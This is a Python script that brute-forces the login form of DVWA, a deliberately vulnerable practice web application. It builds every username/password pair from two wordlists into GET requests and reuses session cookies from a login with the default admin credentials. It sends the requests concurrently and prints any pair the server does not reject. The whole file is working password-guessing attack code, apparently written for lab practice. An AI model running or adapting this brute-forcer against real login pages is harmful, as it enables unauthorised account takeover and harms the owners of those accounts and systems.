# asynchronous requests
import asyncio
# multiple arguments to asyncio
import functools
# requests to get new PHPSESSID
import requests
# exit program when combination found
# DOES NOT WORK
from sys import exit
# measure how long it takes to complete the program
from time import time
# arguments from command line
import argparse

parser  = argparse.ArgumentParser()
parser.add_argument('target_ip')
parser.add_argument('-us', '--users_file')
parser.add_argument('-pw', '--passwords_file')
parser.add_argument('-P', '--protocol')
args    = parser.parse_args()

if (args.users_file == None): args.users_file = 'usernames.txt'
if (args.passwords_file == None): args.passwords_file = 'passwords.txt'
if (args.protocol == None): args.protocol = 'http'

users       = []
passwords   = []

with open(args.users_file, 'r') as users_file:
    users = users_file.read().splitlines()

with open(args.passwords_file, 'r') as passwords_file:
    passwords = passwords_file.read().splitlines()

url_cookies = {}

count = 0

for user in users:
    for password in passwords:
        url = ''
        url += args.protocol + '://'
        url += args.target_ip
        url += '/dvwa/vulnerabilities/brute/'
        #url += 'http://192.168.1.167/dvwa/vulnerabilities/brute/'
        url += '?username=' + user
        url += '&password=' + password
        url += '&Login=Login'
        url_cookies[url] = {}

futures     = []
responses   = []

starting_time   = 0

def get_dvwa_cookies():
    dvwa_login = {'username': 'admin', 'password': 'password', 'Login':'Login'}
    for url in url_cookies.keys():
        with requests.Session() as session:
       	    with session.post('http://192.168.1.167/dvwa/login.php', data=dvwa_login) as req:
                url_cookies[url] = session.cookies.get_dict()

async def main():
    global loop, count

    for url in url_cookies.keys():
        futures.append(loop.run_in_executor(None, functools.partial(requests.get, url, cookies=url_cookies[url])))

    for future in futures:
        response    = await future
        #responses.append(await future)
        count       += 1
        if (b'incorrect' not in response.content):
            print('Number of tries: ' + str(count))
            print(response.url)
            print(response.url.split('username=')[1].split('&')[0], response.url.split('password=')[1].split('&')[0]) 
            print(time() - starting_time)

if (__name__ == '__main__'):
    get_dvwa_cookies()
    loop = asyncio.get_event_loop()
    starting_time = time()
    loop.run_until_complete(main())
    print(time() - starting_time)
